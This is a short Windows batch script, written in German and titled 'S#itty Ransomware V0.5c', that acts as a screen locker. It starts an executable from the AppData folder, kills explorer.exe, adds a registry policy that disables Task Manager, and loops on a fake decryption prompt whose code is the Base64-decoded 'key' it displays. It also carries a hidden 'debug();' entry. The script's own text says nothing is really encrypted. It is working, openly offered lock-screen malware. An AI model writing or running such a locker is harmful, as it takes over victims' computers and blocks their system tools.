@echo off
start C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\KILLV1.exe
taskkill /f /im explorer.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
title S#itty Ransomware V0.5c
color 1
cls
goto :text2

:text
cls
echo Falscher Code!

:text2
echo.
echo sorry, PC ist wiedermal² gesperrt.
echo diesmal aber etwas strenger und besserem code.
echo PC ist immernoch net encrypted weil (immernoch)
echo zu viel Arbeit.
echo Das Program ist immernoch im startup drinne :D
echo Task-Manager ist vllt blockiert, aber ka weil
echo janky code lol
echo Der Encryption Key ist NICHT der Decryption Code
echo /J
echo.
echo dein Encryption-Key: 
echo UGFzc3dvcnQ=
echo.
echo.
echo Decryption-Code Eingabe:
set /p input=">>>":
if "%input%" == "Passwort" goto :end
if "%input%" == "debug();" goto dev:
goto :text

:end
start C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\cleaner.bat
exit

:dev
start C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\debug.bat
cls
goto :text2